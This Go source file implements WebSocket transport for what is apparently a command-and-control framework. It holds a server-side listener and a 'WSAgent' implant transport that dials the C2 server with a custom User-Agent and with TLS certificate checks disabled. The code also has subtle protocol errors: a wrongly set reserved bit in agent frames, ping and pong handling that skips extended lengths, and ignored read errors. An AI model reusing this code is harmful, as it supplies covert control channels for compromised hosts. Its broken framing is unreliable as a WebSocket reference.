package transport

import (
	"bufio"
	"crypto/rand"
	"crypto/sha1"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"
)

// WSListener implements a WebSocket upgrade listener.
type WSListener struct {
	server    *http.Server
	addr      string
	tlsConfig *tls.Config
	acceptCh  chan *wsConn
	quit      chan struct{}
}

// wsConn wraps a WebSocket connection as net.Conn.
type wsConn struct {
	conn       net.Conn
	reader     *bufio.Reader
	writeMu    sync.Mutex
	localAddr  net.Addr
	remoteAddr net.Addr
}

// NewWSListener creates a WebSocket listener.
func NewWSListener(addr string) *WSListener {
	return &WSListener{
		addr:     addr,
		acceptCh: make(chan *wsConn, 128),
		quit:     make(chan struct{}),
	}
}

// NewWSSListener creates a secure WebSocket listener.
func NewWSSListener(addr string, tlsConfig *tls.Config) *WSListener {
	return &WSListener{
		addr:      addr,
		tlsConfig: tlsConfig,
		acceptCh:  make(chan *wsConn, 128),
		quit:      make(chan struct{}),
	}
}

// Start begins the WebSocket listener.
func (l *WSListener) Start() error {
	mux := http.NewServeMux()

	mux.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
		key := r.Header.Get("Sec-WebSocket-Key")
		if key == "" {
			http.Error(w, "missing websocket key", 400)
			return
		}

		// RFC 6455: SHA1 hash of key + magic GUID
		magic := "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
		h := sha1.New()
		h.Write([]byte(key + magic))
		acceptKey := base64.StdEncoding.EncodeToString(h.Sum(nil))

		hj, ok := w.(http.Hijacker)
		if !ok {
			http.Error(w, "hijacking not supported", 500)
			return
		}

		conn, bufrw, err := hj.Hijack()
		if err != nil {
			http.Error(w, err.Error(), 500)
			return
		}

		resp := "HTTP/1.1 101 Switching Protocols\r\n" +
			"Upgrade: websocket\r\n" +
			"Connection: Upgrade\r\n" +
			"Sec-WebSocket-Accept: " + acceptKey + "\r\n\r\n"

		if _, err := conn.Write([]byte(resp)); err != nil {
			conn.Close()
			log.Printf("[WS] Failed to write upgrade response: %v", err)
			return
		}

		ws := &wsConn{
			conn:       conn,
			reader:     bufrw.Reader,
			localAddr:  addr{s: l.addr},
			remoteAddr: conn.RemoteAddr(),
		}

		select {
		case l.acceptCh <- ws:
		default:
			conn.Close()
		}
	})

	l.server = &http.Server{
		Addr:      l.addr,
		Handler:   mux,
		TLSConfig: l.tlsConfig,
	}

	go func() {
		log.Printf("[WS] Listening on %s (TLS: %v)", l.addr, l.tlsConfig != nil)

		var err error
		if l.tlsConfig != nil {
			err = l.server.ListenAndServeTLS("", "")
		} else {
			err = l.server.ListenAndServe()
		}

		if err != nil && err != http.ErrServerClosed {
			log.Printf("[WS] Error: %v", err)
		}
	}()

	return nil
}

// Accept returns the next WebSocket connection.
func (l *WSListener) Accept() (net.Conn, error) {
	select {
	case conn := <-l.acceptCh:
		return conn, nil
	case <-l.quit:
		return nil, fmt.Errorf("listener closed")
	}
}

// Close shuts down the WebSocket listener.
func (l *WSListener) Close() error {
	close(l.quit)
	return l.server.Close()
}

// Addr returns the listener's address.
func (l *WSListener) Addr() net.Addr {
	return addr{s: l.addr}
}

// WebSocket frame opcodes.
const (
	wsTextFrame   = 0x1
	wsBinaryFrame = 0x2
	wsCloseFrame  = 0x8
	wsPingFrame   = 0x9
	wsPongFrame   = 0xA
)

func (c *wsConn) Read(b []byte) (int, error) {
	return c.readWSFrame(b)
}

func (c *wsConn) Write(b []byte) (int, error) {
	c.writeMu.Lock()
	defer c.writeMu.Unlock()
	return c.writeWSFrame(wsBinaryFrame, b)
}

func (c *wsConn) Close() error {
	c.writeMu.Lock()
	defer c.writeMu.Unlock()

	closeFrame := []byte{0x88, 0x00}
	c.conn.Write(closeFrame)
	return c.conn.Close()
}

func (c *wsConn) LocalAddr() net.Addr  { return c.localAddr }
func (c *wsConn) RemoteAddr() net.Addr { return c.remoteAddr }

func (c *wsConn) SetDeadline(t time.Time) error      { return c.conn.SetDeadline(t) }
func (c *wsConn) SetReadDeadline(t time.Time) error  { return c.conn.SetReadDeadline(t) }
func (c *wsConn) SetWriteDeadline(t time.Time) error { return c.conn.SetWriteDeadline(t) }

func (c *wsConn) readWSFrame(buf []byte) (int, error) {
	header := make([]byte, 2)
	if _, err := io.ReadFull(c.reader, header); err != nil {
		return 0, err
	}

	fin := header[0]&0x80 != 0
	opcode := header[0] & 0x0F
	masked := header[1]&0x80 != 0
	payloadLen := uint64(header[1] & 0x7F)

	if !fin {
		return 0, fmt.Errorf("fragmented frames not supported")
	}

	if opcode == wsCloseFrame {
		return 0, fmt.Errorf("websocket closed")
	}

	// Handle ping/pong
	if opcode == wsPingFrame {
		// Read and discard ping payload, send pong
		payload := make([]byte, payloadLen)
		if masked {
			var maskKey [4]byte
			io.ReadFull(c.reader, maskKey[:])
			io.ReadFull(c.reader, payload)
			for i := range payload {
				payload[i] ^= maskKey[i%4]
			}
		} else {
			io.ReadFull(c.reader, payload)
		}
		c.writeMu.Lock()
		c.writeWSFrame(wsPongFrame, payload)
		c.writeMu.Unlock()
		return 0, nil
	}

	if opcode == wsPongFrame {
		payload := make([]byte, payloadLen)
		if masked {
			var maskKey [4]byte
			io.ReadFull(c.reader, maskKey[:])
			io.ReadFull(c.reader, payload)
		} else {
			io.ReadFull(c.reader, payload)
		}
		return 0, nil
	}

	// Extended payload length
	if payloadLen == 126 {
		ext := make([]byte, 2)
		if _, err := io.ReadFull(c.reader, ext); err != nil {
			return 0, err
		}
		payloadLen = uint64(ext[0])<<8 | uint64(ext[1])
	} else if payloadLen == 127 {
		ext := make([]byte, 8)
		if _, err := io.ReadFull(c.reader, ext); err != nil {
			return 0, err
		}
		payloadLen = 0
		for _, by := range ext {
			payloadLen = payloadLen<<8 | uint64(by)
		}
	}

	// Masking key
	var maskKey [4]byte
	if masked {
		if _, err := io.ReadFull(c.reader, maskKey[:]); err != nil {
			return 0, err
		}
	}

	// Payload
	payload := make([]byte, payloadLen)
	if _, err := io.ReadFull(c.reader, payload); err != nil {
		return 0, err
	}

	// Unmask
	if masked {
		for i := range payload {
			payload[i] ^= maskKey[i%4]
		}
	}

	return copy(buf, payload), nil
}

func (c *wsConn) writeWSFrame(opcode byte, data []byte) (int, error) {
	payloadLen := len(data)
	frame := []byte{0x80 | opcode}

	if payloadLen < 126 {
		frame = append(frame, byte(payloadLen))
	} else if payloadLen < 65536 {
		frame = append(frame, 126, byte(payloadLen>>8), byte(payloadLen))
	} else {
		frame = append(frame, 127)
		for i := 7; i >= 0; i-- {
			frame = append(frame, byte(payloadLen>>(i*8)))
		}
	}

	frame = append(frame, data...)

	_, err := c.conn.Write(frame)
	return len(data), err
}

// --- WebSocket Agent Transport ---

// WSAgent connects to C2 via WebSocket.
type WSAgent struct {
	url       string
	userAgent string
	conn      net.Conn
	bufReader *bufio.Reader
}

// NewWSAgent creates a new WebSocket agent transport.
func NewWSAgent(url, userAgent string) *WSAgent {
	return &WSAgent{
		url:       url + "/ws",
		userAgent: userAgent,
	}
}

// Connect performs the WebSocket upgrade handshake.
func (a *WSAgent) Connect() error {
	keyBytes := make([]byte, 16)
	if _, err := rand.Read(keyBytes); err != nil {
		return fmt.Errorf("generate ws key: %w", err)
	}
	wsKey := base64.StdEncoding.EncodeToString(keyBytes)

	host := a.url
	if strings.HasPrefix(host, "wss://") {
		host = strings.TrimPrefix(host, "wss://")
	} else if strings.HasPrefix(host, "ws://") {
		host = strings.TrimPrefix(host, "ws://")
	}
	host = strings.TrimSuffix(host, "/ws")
	host = strings.TrimSuffix(host, "/")

	useTLS := strings.HasPrefix(a.url, "wss://")
	addr := host
	if !strings.Contains(host, ":") {
		if useTLS {
			addr += ":443"
		} else {
			addr += ":80"
		}
	}

	var conn net.Conn
	var err error

	if useTLS {
		conn, err = tls.Dial("tcp", addr, &tls.Config{InsecureSkipVerify: true})
	} else {
		conn, err = net.DialTimeout("tcp", addr, 10*time.Second)
	}
	if err != nil {
		return fmt.Errorf("dial: %w", err)
	}

	req := fmt.Sprintf(
		"GET /ws HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Upgrade: websocket\r\n"+
			"Connection: Upgrade\r\n"+
			"Sec-WebSocket-Key: %s\r\n"+
			"Sec-WebSocket-Version: 13\r\n"+
			"User-Agent: %s\r\n\r\n",
		host, wsKey, a.userAgent)

	if _, err := conn.Write([]byte(req)); err != nil {
		conn.Close()
		return fmt.Errorf("write upgrade: %w", err)
	}

	bufReader := bufio.NewReader(conn)
	resp, err := http.ReadResponse(bufReader, nil)
	if err != nil {
		conn.Close()
		return fmt.Errorf("read response: %w", err)
	}

	if resp.StatusCode != 101 {
		conn.Close()
		return fmt.Errorf("upgrade failed: %s", resp.Status)
	}

	a.conn = conn
	a.bufReader = bufReader
	return nil
}

// Read reads a WebSocket frame.
func (a *WSAgent) Read(b []byte) (int, error) {
	if a.conn == nil {
		return 0, fmt.Errorf("not connected")
	}

	header := make([]byte, 2)
	if _, err := io.ReadFull(a.bufReader, header); err != nil {
		return 0, err
	}

	opcode := header[0] & 0x0F
	payloadLen := uint64(header[1] & 0x7F)

	if opcode == wsCloseFrame {
		return 0, fmt.Errorf("connection closed")
	}

	if payloadLen == 126 {
		ext := make([]byte, 2)
		io.ReadFull(a.bufReader, ext)
		payloadLen = uint64(ext[0])<<8 | uint64(ext[1])
	} else if payloadLen == 127 {
		ext := make([]byte, 8)
		io.ReadFull(a.bufReader, ext)
		payloadLen = 0
		for _, by := range ext {
			payloadLen = payloadLen<<8 | uint64(by)
		}
	}

	payload := make([]byte, payloadLen)
	if _, err := io.ReadFull(a.bufReader, payload); err != nil {
		return 0, err
	}

	return copy(b, payload), nil
}

// Write sends data in a WebSocket binary frame with masking.
func (a *WSAgent) Write(b []byte) (int, error) {
	if a.conn == nil {
		return 0, fmt.Errorf("not connected")
	}

	payloadLen := len(b)
	frame := []byte{0x82 | 0x40} // FIN + Binary + MASK

	if payloadLen < 126 {
		frame = append(frame, byte(payloadLen)|0x80)
	} else if payloadLen < 65536 {
		frame = append(frame, 126|0x80, byte(payloadLen>>8), byte(payloadLen))
	} else {
		frame = append(frame, 127|0x80)
		for i := 7; i >= 0; i-- {
			frame = append(frame, byte(payloadLen>>(i*8)))
		}
	}

	// Mask key (RFC 6455: client MUST mask)
	maskKey := make([]byte, 4)
	rand.Read(maskKey)
	frame = append(frame, maskKey...)

	// Masked payload
	masked := make([]byte, payloadLen)
	for i := range b {
		masked[i] = b[i] ^ maskKey[i%4]
	}
	frame = append(frame, masked...)

	_, err := a.conn.Write(frame)
	return len(b), err
}

// Close closes the WebSocket connection.
func (a *WSAgent) Close() error {
	if a.conn != nil {
		frame := []byte{0x88, 0x00}
		a.conn.Write(frame)
		return a.conn.Close()
	}
	return nil
}

// Ensure imports used
var _ = log.Default
